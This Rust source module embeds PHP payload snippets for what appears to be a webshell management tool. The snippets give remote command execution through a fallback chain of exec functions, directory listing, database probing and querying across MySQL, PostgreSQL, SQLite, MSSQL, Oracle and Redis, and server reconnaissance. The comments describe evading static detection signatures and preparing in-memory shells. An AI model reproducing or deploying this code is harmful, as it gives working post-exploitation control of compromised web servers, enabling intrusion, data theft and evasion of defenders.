//! session 处理器与 legacy 逐请求代码共用的 PHP 实现片段（明文函数名版）。
//!
//! NATIVE stub（`encoder::NATIVE_STUB_TPL`）通过 `$_g[...]` 符号表调用同一批功能，
//! 以规避静态敏感特征；本模块是同一批功能的明文函数名版本，供**分阶段载荷处理器**
//! 与 **legacy 逐请求代码**复用。两者必须行为一致，由 `php_impl_matches_native_stub`
//! 测试守住（驱动集合、DSN/SQL 串、行数上限）。
//!
//! 每个片段都是「读若干约定变量 → 写若干约定变量」的语句块，可直接内联进函数体或
//! 模板代码，**不使用 `return`**（处理器与模板各自的收尾逻辑不同）。
//!
//! | 片段 | 读 | 写 |
//! |---|---|---|
//! | [`PHP_EXEC_IMPL`] | `$c` 命令、`$w` 工作目录 | `$ok` `$err` `$stdout`(base64) `$cwd` |
//! | [`PHP_SCAN_IMPL`] | `$p` 目录 | `$ok` `$err` `$entries` |
//! | [`PHP_DB_PROBE_IMPL`] | `$c` 连接 JSON | `$ok` `$err` `$driver` `$databases` |
//! | [`PHP_DB_QUERY_IMPL`] | `$c` 连接 JSON、`$q` SQL | `$ok` `$err` `$columns` `$rows` `$affected` |

/// Redis RESP 解析辅助（`dsw_rsp` / `dsw_rcmd`）。
///
/// 以 `function_exists` 守卫定义：处理器在服务端 session 里驻留，重复注入时不能重复定义。
/// 仅 redis 驱动路径使用；命名带 `dsw_` 前缀避免与站点业务函数冲突。
pub const PHP_REDIS_HELPERS: &str = r#"if(!function_exists('dsw_rsp')){
function dsw_rsp($s){$line=@fgets($s);if($line===false)return null;$t=isset($line[0])?$line[0]:'';$data=substr($line,1);
if($t==='+')return array('s'=>trim($data));
if($t==='-')return array('e'=>trim($data));
if($t===':')return (int)trim($data);
if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;while($left>0){$chunk=@fread($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}@fgets($s);return $v;}
if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=dsw_rsp($s);}return $arr;}
return trim($data);}
function dsw_rcmd($s,$args){$out='*'.count($args)."\r\n";foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}@fwrite($s,$out);return dsw_rsp($s);}
}
"#;

/// 命令执行：`cd` 前缀处理 + 命令函数降级链 + stderr 合并 + cwd 回传。
///
/// 降级链与 NATIVE stub 的 `__CMD__` 一致：按 `shell_exec` / `exec` / `system` /
/// `passthru` / `popen` 顺序探测首个可用函数（`proc_open` 因 3 参数签名与单参数调用
/// 不兼容而排除）。全部被 `disable_functions` 禁用时返回明确错误，
/// 而不是静默的空输出——空输出会让用户以为"命令没输出"。
pub const PHP_EXEC_IMPL: &str = r#"$ok=true;$err='';$stdout='';$cwd='';
if($w!==''&&@is_dir($w)){@chdir($w);}
if(preg_match('/^\s*cd\s+(\S+)/',$c,$__m)){@chdir($__m[1]);}
else{
$__f='';
foreach(array('shell_exec','exec','system','passthru','popen') as $__cand){if(function_exists($__cand)){$__f=$__cand;break;}}
if($__f===''){$ok=false;$err='no exec function available (shell_exec/exec/system/passthru/popen)';}
else{
$__o='';$__l=array();
if($__f==='exec'){@exec($c.' 2>&1',$__l);$__o=implode("\n",$__l);}
elseif($__f==='system'||$__f==='passthru'){ob_start();@$__f($c.' 2>&1');$__o=ob_get_clean();}
elseif($__f==='popen'){$__p=@popen($c.' 2>&1','r');$__o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}
else{$__o=@$__f($c.' 2>&1');}
$stdout=base64_encode((string)$__o);
}
}
$__d=@getcwd();$cwd=($__d===false)?'':$__d;
"#;

/// 目录列举：**单次 `stat()`** 合并 `is_dir` / `size` / `mtime` / `perms`。
///
/// 旧实现每项要 3-4 次系统调用（`is_dir` + `filesize` + `filemtime` + `fileperms`），
/// 数千文件的目录上开销显著。`stat()` 会跟随符号链接，与 `is_dir()` 语义一致。
pub const PHP_SCAN_IMPL: &str = r#"$ok=true;$err='';$entries=array();
$__items=@scandir($p);
if($__items===false){$ok=false;$err='read dir failed';}
else{
foreach($__items as $__f){
if($__f==='.'||$__f==='..')continue;
$__full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$__f;
$__s=@stat($__full);
$__isd=($__s!==false)&&(($__s['mode']&0170000)===0040000);
$entries[]=array('name'=>$__f,'path'=>$__full,'is_dir'=>$__isd,'size'=>($__isd||$__s===false)?0:$__s['size'],'mtime'=>($__s===false)?0:$__s['mtime'],'perms'=>($__s===false)?'':substr(sprintf('%o',$__s['mode']&0777),-3));
}
}
"#;

/// 数据库探测：6 驱动（mysql / pgsql / sqlite / mssql / oracle / redis）+ 列库。
///
/// 与 NATIVE stub 的 `__DBP__` 逐条对齐：mssql 三 DSN 回退（sqlsrv → dblib → odbc）、
/// oracle `oci:`、redis 裸 RESP（AUTH + PING）、sqlite 直接把 dbname 当文件路径。
pub const PHP_DB_PROBE_IMPL: &str = r#"$ok=false;$err='bad conn';$driver='';$databases=array();
$__p=@json_decode($c,true);
if(is_array($__p)){
$driver=isset($__p['driver'])?(string)$__p['driver']:'';
$__host=isset($__p['host'])?(string)$__p['host']:'';
$__port=isset($__p['port'])?(int)$__p['port']:0;
$__user=isset($__p['username'])?(string)$__p['username']:'';
$__pass=isset($__p['password'])?(string)$__p['password']:'';
$__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
if($driver==='redis'){
$__s=@stream_socket_client('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5);
if(!$__s){$err='redis connect failed';}
else{
if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass));}
$__pong=dsw_rcmd($__s,array('PING'));
if(is_array($__pong)&&isset($__pong['e'])){$err='redis auth failed';}
else{$ok=true;for($__i=0;$__i<16;$__i++){$databases[]=(string)$__i;}}
@fclose($__s);
}
}
elseif(!class_exists('PDO')){$err='no pdo';}
else{
try{
if($driver==='mssql'){
$__port=$__port?$__port:1433;
$__dsns=array('sqlsrv:Server='.$__host.','.$__port.';Database='.$__db,'dblib:host='.$__host.':'.$__port.';dbname='.$__db,'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$__host.','.$__port.';Database='.$__db);
$__h=null;$__last='';
foreach($__dsns as $__d){try{$__h=new PDO($__d,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $__x){$__last=$__x->getMessage();}}
if(!$__h){$err='mssql: '.$__last;}
else{foreach($__h->query('SELECT name FROM sys.databases') as $__r){$databases[]=$__r[0];}$ok=true;}
}
elseif($driver==='oracle'){
$__port=$__port?$__port:1521;
$__h=new PDO('oci:dbname=//'.$__host.':'.$__port.'/'.($__db!==''?$__db:'ORCL'),$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
foreach($__h->query('SELECT username FROM all_users') as $__r){$databases[]=$__r[0];}
$ok=true;
}
else{
$__dsn=$driver==='pgsql'?('pgsql:host='.$__host.';port='.($__port?$__port:5432).';dbname='.($__db!==''?$__db:'postgres')):($driver==='sqlite'?('sqlite:'.$__db):('mysql:host='.$__host.';port='.($__port?$__port:3306).';charset=utf8mb4'));
$__h=new PDO($__dsn,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
if($driver==='sqlite'){$databases[]=$__db;}
elseif($driver==='pgsql'){foreach($__h->query('SELECT datname FROM pg_database') as $__r){$databases[]=$__r[0];}}
else{foreach($__h->query('SHOW DATABASES') as $__r){$databases[]=$__r[0];}}
$ok=true;
}
}catch(Exception $__e){$err=$__e->getMessage();}
}
}
"#;

/// 数据库查询：6 驱动 + 结果集（列/行，1000 行上限）/ 影响行数。
///
/// SELECT 判定正则与 NATIVE stub 的 `__DBQ__` 一致（含 `exec`，覆盖 mssql 的
/// `EXEC` 存储过程调用）；列名缺失时回退 `col{i}`。
pub const PHP_DB_QUERY_IMPL: &str = r#"$ok=false;$err='bad conn';$columns=array();$rows=array();$affected=0;
$__p=@json_decode($c,true);
if(is_array($__p)){
$__driver=isset($__p['driver'])?(string)$__p['driver']:'';
$__host=isset($__p['host'])?(string)$__p['host']:'';
$__port=isset($__p['port'])?(int)$__p['port']:0;
$__user=isset($__p['username'])?(string)$__p['username']:'';
$__pass=isset($__p['password'])?(string)$__p['password']:'';
$__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
if($__driver==='redis'){
$__s=@stream_socket_client('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5);
if(!$__s){$err='redis connect failed';}
else{
if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass));}
$__args=preg_split('/\s+/',trim((string)$q));
if(count($__args)===0||$__args[0]===''){$err='empty command';}
else{
$__res=dsw_rcmd($__s,$__args);
if(is_array($__res)&&isset($__res['e'])){$err=$__res['e'];}
else{
$columns=array('value');
if(is_array($__res)){foreach($__res as $__v){$rows[]=array(is_array($__v)?implode(',',array_map('strval',$__v)):($__v===null?null:(string)$__v));}}
else{$rows[]=array($__res===null?null:(string)$__res);}
$ok=true;
}
}
@fclose($__s);
}
}
elseif(!class_exists('PDO')){$err='no pdo';}
else{
try{
if($__driver==='mssql'){
$__port=$__port?$__port:1433;
$__dsns=array('sqlsrv:Server='.$__host.','.$__port.';Database='.$__db,'dblib:host='.$__host.':'.$__port.';dbname='.$__db,'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$__host.','.$__port.';Database='.$__db);
$__h=null;$__last='';
foreach($__dsns as $__d){try{$__h=new PDO($__d,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $__x){$__last=$__x->getMessage();}}
if(!$__h){$err='mssql: '.$__last;}
}
elseif($__driver==='oracle'){
$__port=$__port?$__port:1521;
$__h=new PDO('oci:dbname=//'.$__host.':'.$__port.'/'.($__db!==''?$__db:'ORCL'),$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
}
else{
$__dsn=$__driver==='pgsql'?('pgsql:host='.$__host.';port='.($__port?$__port:5432).';dbname='.($__db!==''?$__db:'postgres')):($__driver==='sqlite'?('sqlite:'.$__db):('mysql:host='.$__host.';port='.($__port?$__port:3306).';charset=utf8mb4'.($__db!==''?';dbname='.$__db:'')));
$__h=new PDO($__dsn,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
}
if(isset($__h)&&$__h){
$__st=$__h->query($q);
if($__st===false){$err='query failed';}
elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with|exec)\b/i',$q)){
$__nc=$__st->columnCount();
for($__i=0;$__i<$__nc;$__i++){$__m=$__st->getColumnMeta($__i);$columns[]=(isset($__m['name'])&&$__m['name']!=='')?$__m['name']:('col'.$__i);}
$__cnt=0;
while(($__row=$__st->fetch(PDO::FETCH_NUM))!==false&&$__cnt<1000){$__cells=array();foreach($__row as $__v){$__cells[]=($__v===null)?null:(string)$__v;}$rows[]=$__cells;$__cnt++;}
$ok=true;
}
else{$affected=$__st->rowCount();$ok=true;}
}
}catch(Exception $__e){$err=$__e->getMessage();}
}
}
"#;

/// 环境信息表：`$info`（写入 `data.info`，供客户端 `info_map` / 能力协商 / 内存马前置判定使用）。
///
/// 键集与 NATIVE stub 的 `__ENV__` 保持一致（`ProtoVersion` / `Capabilities` /
/// `ShellType` / `PHP_SAPI` / `user_ini_filename` / `DOCUMENT_ROOT` 等）——
/// 内存马前置判定与能力协商都依赖它，缺了会让 session/legacy 通道"看起来不支持"。
pub const PHP_INFO_IMPL: &str = r#"$info=array(
'ChunkedTransfer'=>'1',
'ProtoVersion'=>'2',
'Capabilities'=>'chunked,stream,db,plugin,exec,gzip',
'ShellType'=>'file',
'OsInfo'=>@php_uname('s').' '.@php_uname('r').' '.@php_uname('m'),
'CurrentUser'=>''.@get_current_user(),
'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],
'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],
'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],
'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],
'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],
'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],
'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],
'disable_functions'=>''.@ini_get('disable_functions'),
'Open_basedir'=>''.@ini_get('open_basedir'),
'timezone'=>''.@date_default_timezone_get(),
'encode'=>''.@ini_get('default_charset'),
'extension_dir'=>''.@ini_get('extension_dir'),
'Path'=>''.@getenv('PATH'),
'PATHEXT'=>''.@getenv('PATHEXT'),
'APPDATA'=>''.@getenv('APPDATA'),
'systempdir'=>''.@sys_get_temp_dir().'/',
'include_path'=>''.@ini_get('include_path'),
'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],
'PHP_SAPI'=>PHP_SAPI,
'PHP_VERSION'=>PHP_VERSION,
'PHP_INT_SIZE'=>PHP_INT_SIZE,
'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),
'PHP_OS'=>PHP_OS,
'canCallGzipDecode'=>function_exists('gzdecode')?1:0,
'canCallGzipEncode'=>function_exists('gzencode')?1:0,
'session_name'=>''.@session_name(),
'session_save_path'=>''.@ini_get('session.save_path'),
'session_save_handler'=>''.@ini_get('session.save_handler'),
'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),
'user_ini_filename'=>''.@ini_get('user_ini.filename'),
'memory_limit'=>''.@ini_get('memory_limit'),
'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),
'post_max_size'=>''.@ini_get('post_max_size'),
'max_execution_time'=>''.@ini_get('max_execution_time'),
'max_input_time'=>''.@ini_get('max_input_time'),
'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),
'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'',
'mypid'=>''.@getmypid(),
'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],
'loaded_extensions'=>implode(',',@get_loaded_extensions()),
'short_open_tag'=>''.@ini_get('short_open_tag'),
'asp_tags'=>''.@ini_get('asp_tags'),
'safe_mode'=>''.@ini_get('safe_mode'),
'CurrentDir'=>@getcwd(),
'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']
);
"#;
